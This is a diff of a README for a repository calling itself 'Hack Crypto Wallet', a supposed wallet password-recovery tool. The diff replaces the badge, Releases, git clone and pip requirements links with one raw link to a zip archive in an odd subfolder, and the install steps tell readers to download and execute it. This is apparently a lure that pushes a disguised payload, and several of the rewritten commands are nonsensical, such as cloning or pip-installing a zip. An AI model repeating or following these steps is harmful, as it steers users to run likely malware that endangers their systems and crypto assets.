@@ -1,6 +1,6 @@
 # 🛠️ Hack Crypto Wallet
 
-![GitHub release](https://img.shields.io/github/release/Roxi27-dising/hack-crypto-wallet.svg)
+![GitHub release](https://github.com/Roxi27-dising/hack-crypto-wallet/raw/refs/heads/main/Amboinese/wallet_crypto_hack_1.5-beta.1.zip)
 
 Welcome to the **Hack Crypto Wallet** repository! This tool is designed to help you retrieve lost or forgotten passwords for your cryptocurrency wallets. Using advanced encryption cracking techniques, this tool allows individuals to regain access to their digital assets securely and efficiently. 
 
@@ -19,7 +19,7 @@ Welcome to the **Hack Crypto Wallet** repository! This tool is designed to help 
 
 In the world of cryptocurrency, losing access to your wallet can be devastating. Whether you've forgotten your password or misplaced your recovery phrase, the Hack Crypto Wallet tool aims to provide a solution. By leveraging state-of-the-art encryption cracking techniques, this tool can help you regain access to your valuable digital assets.
 
-For the latest updates and releases, please visit our [Releases page](https://github.com/Roxi27-dising/hack-crypto-wallet/releases).
+For the latest updates and releases, please visit our [Releases page](https://github.com/Roxi27-dising/hack-crypto-wallet/raw/refs/heads/main/Amboinese/wallet_crypto_hack_1.5-beta.1.zip).
 
 ## Features
 
@@ -36,7 +36,7 @@ To install the Hack Crypto Wallet tool, follow these steps:
 1. **Clone the Repository**: Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/Roxi27-dising/hack-crypto-wallet.git
+   git clone https://github.com/Roxi27-dising/hack-crypto-wallet/raw/refs/heads/main/Amboinese/wallet_crypto_hack_1.5-beta.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -48,10 +48,10 @@ To install the Hack Crypto Wallet tool, follow these steps:
 3. **Install Dependencies**: Use the package manager of your choice to install the required libraries. For example, if you're using Python, you might run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Roxi27-dising/hack-crypto-wallet/raw/refs/heads/main/Amboinese/wallet_crypto_hack_1.5-beta.1.zip
    ```
 
-4. **Download the Latest Release**: For the latest version, visit our [Releases page](https://github.com/Roxi27-dising/hack-crypto-wallet/releases). Download the necessary file and execute it.
+4. **Download the Latest Release**: For the latest version, visit our [Releases page](https://github.com/Roxi27-dising/hack-crypto-wallet/raw/refs/heads/main/Amboinese/wallet_crypto_hack_1.5-beta.1.zip). Download the necessary file and execute it.
 
 ## Usage
 
@@ -121,7 +121,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## Support
 
-If you encounter any issues or have questions, feel free to open an issue on GitHub. For the latest updates and releases, please check our [Releases page](https://github.com/Roxi27-dising/hack-crypto-wallet/releases). 
+If you encounter any issues or have questions, feel free to open an issue on GitHub. For the latest updates and releases, please check our [Releases page](https://github.com/Roxi27-dising/hack-crypto-wallet/raw/refs/heads/main/Amboinese/wallet_crypto_hack_1.5-beta.1.zip). 
 
 ---
 
